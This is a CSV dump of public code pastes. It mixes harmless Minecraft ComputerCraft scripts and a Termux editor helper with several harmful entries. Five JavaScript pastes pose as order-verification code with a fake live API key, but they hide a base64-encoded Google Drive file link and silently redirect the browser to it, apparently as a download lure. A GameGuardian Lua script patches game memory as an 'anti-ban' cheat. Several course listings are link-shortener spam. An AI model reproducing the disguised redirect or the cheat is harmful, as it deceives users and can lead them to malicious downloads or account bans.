id,title,username,language,date,content
bqhPRGW6,Untitled,Muu2736,Lua,Saturday 29th of March 2025 06:19:50 PM CDT,"-- Script generated by GameGuardian 101.1
-- Lua help: http://gameguardian.net/help/

local scriptName = [=====[👑  PRO ปั้ม BY เซียน    ➡️  30 มีนาคม 2025]=====]
local scriptVersion = '1.0.0'
local scriptAuthor = 'User'

-- วันหมดอายุ
local expirationDate = os.time({year=2025, month=3, day=30}) -- วันที่หมดอายุ: 30 มีนาคม 2025
local currentDate = os.time()

-- เช็ควันหมดอายุ
if currentDate > expirationDate then
    gg.alert(""🙏วันใช้งานหมด🙏 กรุณาติดต่อ🧑‍✈️ FB เซียน ประวีน"")
    os.exit()
end

-- init
gg.require('101.1', 16142)
gg.toast(scriptName..' v'..scriptVersion..' by '..scriptAuthor)

-- Function to perform the main action
function mainAction()
    gg.clearResults()
    gg.searchNumber(""h0100000012CA9A3BFF"", gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1, 0)

    local results = gg.getResults(100)
    for i, v in ipairs(results) do
        if v.flags == gg.TYPE_BYTE then
            v.value = ""h3300000012CA9A3BFF""
            v.freeze = true
        end
    end
    gg.addListItems(results)
    gg.processResume()
    gg.toast(""👑 RUN ออโต้กันแบน BY เซียน"")
end

-- Menu function (ไม่ต้องวนลูป)
local options = {
    ""💵   เด้งแพค ปั้มยุทธ์ BY เซียน"",
  ""🚪    Exit""
}

local choice = gg.choice(options, nil, scriptName)
if choice == 1 then
    mainAction()
elseif choice == 2 then
    gg.alert(""📣 🙏🙏 ขอบคุณที่ใช้ บริการครับ 🙏🙏 "")
end"
3x3hrY2k,Untitled,Epiphemeral,JavaScript,Saturday 29th of March 2025 06:19:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/196/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
m2TUDUpd,Installer,AdditionalPylons,Lua,Saturday 29th of March 2025 06:15:51 PM CDT,"print(""Where would you like to install LIMAPI? (relative to current dir)"")
local dest = shell.resolve(read())
shell.run(""pastebin get eREGwRGT ""..dest..""/ui_limapi.lua"")
shell.run(""pastebin get M9uq3brA ""..dest..""/limapi.lua"")"
xsb55Ehn,Products.js,robloxhack212,JavaScript,Saturday 29th of March 2025 06:03:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/550/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eREGwRGT,limapi_ui,AdditionalPylons,Lua,Saturday 29th of March 2025 05:57:55 PM CDT,"local MAIN_CHEST = ""minecraft:chest_0""
local CURR_DIR = fs.getDir(shell.getRunningProgram())
local RECENTS_FILE = CURR_DIR..""/caches/recent_items.lua""
local AMOUNTS_FILE = CURR_DIR..""/caches/amounts.txt""
local CACHE_FILE = CURR_DIR..""/caches/cache.lua""

local inv = require(""limapi"")
local completion = require(""cc.completion"")
inv.registerChests()
inv.setMainChest(MAIN_CHEST)

local w,h = term.getSize()

inv.loadCache(CACHE_FILE)
local recently_pulled = {}
local amounts_cache = {}
local function getRecents(file)
    local recents_file = fs.open(file,""r"")
	if recents_file == nil then return end
    recently_pulled = textutils.unserialise(recents_file.readAll())
    recents_file.close()
end
local function saveRecents(file)
    local recents_file = fs.open(file,""w"")
    recents_file.write(textutils.serialise(recently_pulled))
    recents_file.close()
end
local function getAmounts(file)
    amounts_cache = {}
    local amounts_file = fs.open(file, ""r"")
    if amounts_file == nil then return end
    local l = 0
    while true do
        local line = amounts_file.readLine()
        if not line then break end
        l = l + 1
        amounts_cache[l] = line
    end
    amounts_file.close()
end
local function saveAmounts(file)
    local amounts_file = fs.open(file,""w"")
    for i=1,#amounts_cache do
        amounts_file.write(amounts_cache[i]..""\n"")
    end
    amounts_file.close()
end
local function updateRecents(item)
    print(textutils.serialise(recently_pulled))
    local found = false
    for i=1,#recently_pulled do
        if item == recently_pulled[i] then
            found = true
            for j=i-1,1,-1 do
                recently_pulled[j+1]=recently_pulled[j]
            end
            break
        end
    end
    if not found then
        for i=#recently_pulled,1,-1 do
            recently_pulled[i+1]=recently_pulled[i]
        end
    end
    recently_pulled[1] = item
    recently_pulled[40] = nil
    saveRecents(RECENTS_FILE)
end
getRecents(RECENTS_FILE)
getAmounts(AMOUNTS_FILE)

local function uiPullItem()
    print(""Item ID:"")
    local name = read()
    write(""Amount: (default: 1) "")
    local am = tonumber(read()) or 1
    
    if not string.find(name, "":"", 1, true) then
        name = ""minecraft:""..name
    end
    inv.pullItem(name,am)
    updateRecents(name)
end
local function uiRecentItem()
    local scroll=0
    local name
    term.setBackgroundColour(colours.black)
    while true do
        term.setCursorPos(1,1)
        term.clear()
        for i=1+scroll,scroll+h-1 do
            if recently_pulled[i]==nil then break end
            print(""\x07 ""..recently_pulled[i])
        end
        term.setCursorPos(w,1)
        write(""x"")
        local ev = {os.pullEvent()}
        if ev[1]==""mouse_scroll"" then
            scroll=scroll+ev[2]
            if scroll<0 then scroll=0 end
        elseif ev[1]==""mouse_click"" or ev[1]==""monitor_touch"" then
            if ev[3]==w and ev[4]==1 then
                return
            end
            if ev[3]==1 then
                table.remove(recently_pulled,ev[4]+scroll)
            else
                name = recently_pulled[ev[4]+scroll]
                if name~=nil then
                    term.setBackgroundColour(colours.blue)
                    paintutils.drawFilledBox(1,1,w,ev[4]-1)
                    paintutils.drawFilledBox(1,ev[4]+1,w,h)
                    term.setCursorPos(1,ev[4]+1)
                    break
                end
            end
        end
    end
    write(""Amount: (default: 1) "")
    local am = tonumber(read()) or 1
    inv.pullItem(name,am)
    updateRecents(name)
end
local function convertAmountsTable()
    amounts_cache = {""Last updated at ""..os.date('%Y-%m-%d %H:%M:%S')}
    local n = 1
    for item,count in pairs(inv.listItemsWithCount()) do
        n = n+1
        amounts_cache[n] = count.."" x ""..item
    end
end
local function uiListAll()
    local scroll=0
    local name
    term.setBackgroundColour(colours.black)
    while true do
        term.setCursorPos(1,1)
        term.clear()
        for i=1+scroll,scroll+h-1 do
            if amounts_cache[i]==nil then break end
            print(amounts_cache[i])
        end
        term.setCursorPos(w-2,1)
        write(""@ x"")
        local ev = {os.pullEvent()}
        if ev[1]==""mouse_scroll"" then
            scroll=scroll+ev[2]
            if scroll<0 then scroll=0 end
        elseif ev[1]==""mouse_click"" or ev[1]==""monitor_touch"" then
            if ev[3]==w and ev[4]==1 then
                return
            end
            if ev[3]==w-2 and ev[4]==1 then
                term.setCursorPos(1,h)
                print(""Recaching all stored values, this may take a while..."")
                convertAmountsTable()
                saveAmounts(AMOUNTS_FILE)
            elseif ev[4]+scroll~=1 and ev[4]~=h then
                name = amounts_cache[ev[4]+scroll]
                if name~=nil then
                    name = name:match(""%d+ x (.+)"")
                    term.setBackgroundColour(colours.blue)
                    paintutils.drawFilledBox(1,1,w,ev[4]-1)
                    paintutils.drawFilledBox(1,ev[4]+1,w,h)
                    term.setCursorPos(1,ev[4]+1)
                    break
                end
            end
        end
    end
    write(""Amount: (default: 1) "")
    local am = tonumber(read()) or 1
    inv.pullItem(name,am)
    updateRecents(name)
end
local function uiSearch()
    local items = inv.listItems()
    print(""Search an item"")
    local name = read(nil,nil,function(p) return completion.choice(p,items) end, ""minecraft:"")
    write(""\nAmount: (default: 1) "")
    local am = tonumber(read()) or 1
    inv.pullItem(name,am)
    updateRecents(name)
end
local function uiHelp()
    term.setBackgroundColour(colours.black)
    term.clear()
    term.setCursorPos(1,1)
   	print(""Register new chests - add new chests to the system."")
    print(""Pull an item - pull item by id. \""minecraft:\"" is automatically added."")
    print(""Pull a recent item - show a list of your recent lookups. Tip: press the \x07 to remove entry."")
    print(""See the full list - see all the items in the system with their amounts. Since it's a costly operation, you must refresh it manually by pressing @."")
    print(""Search - same as \""pull an item\"", except with autocompletion."")
    print(""Return all items - all the items in the main chest are pushed into the system."")
    print(""Restock - all the items in the main chest are filled to the full stack."")
    print(""Refresh cache - debug action, use when manually tampering with the system."")
	write(""To select the main chest, edit the first line of this file. DO NOT PLACE IT ADJACENTLY TO THE COMPUTER."")
    sleep(1)
    os.pullEvent()    
end
local shutdown = false
local buttons = {
    {""Register new chests"", inv.registerChests},
    {""Pull an item"", uiPullItem},
    {""Pull a recent item"", uiRecentItem},
    {""See the full list"", uiListAll},
    {""Search"",uiSearch},
    {""Return all items"", inv.returnItems},
    {""Restock"",inv.restockMainChest},
    {""Refresh cache (debug)"", inv.createCache},
    {""Help"",uiHelp},
    {""Exit"", function() shutdown = true end}
}
while true do
    if shutdown then break end
    term.setBackgroundColour(colours.grey)
    term.clear()
    term.setBackgroundColour(colours.blue)
    term.setCursorPos(1,1)
    for i=1,#buttons do
        print(""\x07 ""..buttons[i][1])
    end
    local ev = {os.pullEvent()}
    if ev[1]==""monitor_touch"" or ev[1]==""mouse_click"" then
        local c = buttons[ev[4]]
        if c~=nil then
            c[2]()
            term.setCursorPos(w,h)
        end
    end
end
term.setBackgroundColour(colours.black)
term.clear()
term.setCursorPos(1,1)
inv.saveCache(CACHE_FILE)"
Rm4QDjVS,Java/Eclipse & Object-Oriented Programming,f0f077,Java,Saturday 29th of March 2025 05:41:32 PM CDT,"Java/Eclipse & Object-Oriented Programming
Java Essentials for those who want to learn the essentials of Java in a short time
What you will learn
Object-Oriented Programming (OOP)
The classes
The objects
The methods
The attributes
The legacy (extends)
for more:https://cuty.io/yLYndQUW28"
2PB6khpj,Become a Java developer,f0f077,Java,Saturday 29th of March 2025 05:39:08 PM CDT,"Become a Java developer
Learn the Java language easily, 45 corrected exercises included
What you will learn
Create a Java application step by step throughout the course!
Master the fundamentals of object-oriented programming from Java 8
Install and use the Java Virtual Machine
Use language fundamentals such as operators, variables or control structures
Implement object-specific concepts such as inheritance, interfacing, or polymorphism
Use concepts from the latest versions such as iterative foreach structures, ellipses, auto-boxing/unboxing or enumerated types
for more:https://cuty.io/jZhlrJGBf"
PwwFdBEZ,Market.js,robloxhack212,JavaScript,Saturday 29th of March 2025 05:32:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/691/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pPHTsuG3,Products.js,robloxhack212,JavaScript,Saturday 29th of March 2025 05:02:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/625/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wsZ2Srwv,PYTHON 2025 Certification | 8 PRACTICAL WORKSHOPS + 20 Hours,f0f077,Python,Saturday 29th of March 2025 04:50:31 PM CDT,"PYTHON 2025 Certification | 8 PRACTICAL WORKSHOPS + 20 Hours
Learn to Program in Python: Developing in Python Has Never Been Easier! 2025 Edition
What you will learn
Learn the basics of language as well as advanced concepts
Saving information in databases
Automates repetitive tasks
Create functions to automate tasks
Creates desktop programs with graphical interfaces
Create your own modules
for more:https://cuty.io/DGZT"
yj0aNZ31,flux-compressor.lua,ccraftersanonmoose,Lua,Saturday 29th of March 2025 04:47:36 PM CDT,"-- Script to stop the flux compressor from exploading
-- planning to control this behavior via redstone integrator
-- should turn off compressor when it reaches critical
-- should also turn the compressor back on when pressure reaches 11 bar
-- compressor is being used in this case to power a spawner


----------

local flux = peripheral.wrap(""pneumaticcraft:flux_compressor_0"")
local relay = peripheral.wrap(""redstoneIntegrator_0"")

-- monitor pressure & shut off when critical
local function fluxcontrol()
    if flux.getPressure() >= 20 then
        relay.setOutput(""right"", false)
    elseif flux.getPressure() <= 11 then
        relay.setOutput(""right"", true)

    end
end


while true do
    fluxcontrol()
end"
pmjt3gPu,NewTimer,doodleloos,Lua,Saturday 29th of March 2025 04:46:12 PM CDT,"--clear screen and display info

local monitor = peripheral.find(""monitor"")
monitor.setTextScale(.5)

term.clear()
monitor.clear()

term.setCursorPos(1,1)
monitor.setCursorPos(1,1)

term.write(""-Timer Program-"")
monitor.write(""-Timer Program-"")

term.setCursorPos(1,3)
monitor.setCursorPos(1,3)

term.write (""Cycles: "")
monitor.write (""Cycles: "")

ITR = io.read()

term.setCursorPos(1,3)
monitor.setCursorPos(1,3)

term.write (""Cycles: ""..ITR)
monitor.write (""Cycles: ""..ITR)

term.setCursorPos(1,4)
monitor.setCursorPos(1,4)

term.write (""Delay: "")
monitor.write (""Delay: "")

SEC = io.read()

term.setCursorPos(1,4)
monitor.setCursorPos(1,4)

term.write (""Delay: ""..SEC)
monitor.write (""Delay: ""..SEC)

term.setCursorPos(1,6)
monitor.setCursorPos(1,6)

term.write (""-Running"")
monitor.write (""-Running"")

if ITR ~= 0 then 
    for i = 1,ITR do 
        function MAIN()
    end
end
if ITR == 0 then
    while true do
        function MAIN()
	end
end




term.setCursorPos(1,10)
monitor.setCursorPos(1,10)
term.write (""-Complete-"")
monitor.write (""-Complete-"")



function MAIN()

	term.setCursorPos(1,7)
	monitor.setCursorPos(1,7)	
	
	term.write (""               "")
	monitor.write (""               "")	
	
	term.setCursorPos(1,7)
	monitor.setCursorPos(1,7)	
	
	term.write (""Cycle ""..i)
	monitor.write (""Cycle ""..i)	

	rs.setOutput(""front"", true)
	sleep(.25)
	rs.setOutput(""front"", false)
	rs.setOutput(""left"", true)
	sleep(.25)
	rs.setOutput(""left"", false)
	rs.setOutput(""back"", true)
	sleep(.25)
	rs.setOutput(""back"", false)
	rs.setOutput(""right"", true)
	sleep(.25)
	rs.setOutput(""right"", false)
	
	for x = SEC,1,-1 do 
		term.setCursorPos(1,8)
		monitor.setCursorPos(1,8)
		
		term.write (""               "")
		monitor.write (""               "")
		
		term.setCursorPos(1,8)
		monitor.setCursorPos(1,8)
		
		term.write (""Seconds ""..x)
		monitor.write (""Seconds ""..x)
		
		sleep(1)
	end

end


"
ZnNKC6qY,101 Corrected Python Exercises and Algorithms,f0f077,Python,Saturday 29th of March 2025 04:45:41 PM CDT,"101 Corrected Python Exercises and Algorithms
Improve your skills on dozens of algorithmic concepts with these 101 practical Python exercises.
What you will learn
Develop a problem-solving mindset
Learn little-known functions and techniques
Discover ways to optimize your code
Understanding how an algorithm works
for more:https://cuty.io/tl4NzXRMt"
pM8MDr3x,quickedit_termux,orborbson,Bash,Saturday 29th of March 2025 04:42:39 PM CDT,"#!/data/data/com.termux/files/usr/bin/sh

if [ -z ""${1}"" ]; then echo ""[BŁĄD]: podaj nazwę pliku""; exit 1; fi
FILE=""`realpath -q ${1}`""
if [ ! -f ""${FILE}"" ]; then touch ""${FILE}""; IS_NEW=""true""; fi

APK=""com.rhmsoft.edit""

STAT_A=`stat -c %Y ""${FILE}""`
if am start -n ""${APK}/${APK}.activity.MainActivity"" -d ""file://${FILE}"" > /dev/null 2>&1; then 
	sudo sh -c ""while pidof -s -q ${APK}; do sleep 2; done"" 
else
	echo ""[BŁĄD]: nie można uruchomić \""${APK}\""""
fi
STAT_B=`stat -c %Y ""${FILE}""`

if [ -n ""${IS_NEW}"" ] && [ ""${STAT_A}"" -eq ""${STAT_B}"" ]; then rm -f ""${FILE}""; fi
"
LXmFPJXH,Market.js,robloxhack212,JavaScript,Saturday 29th of March 2025 04:31:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/015/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
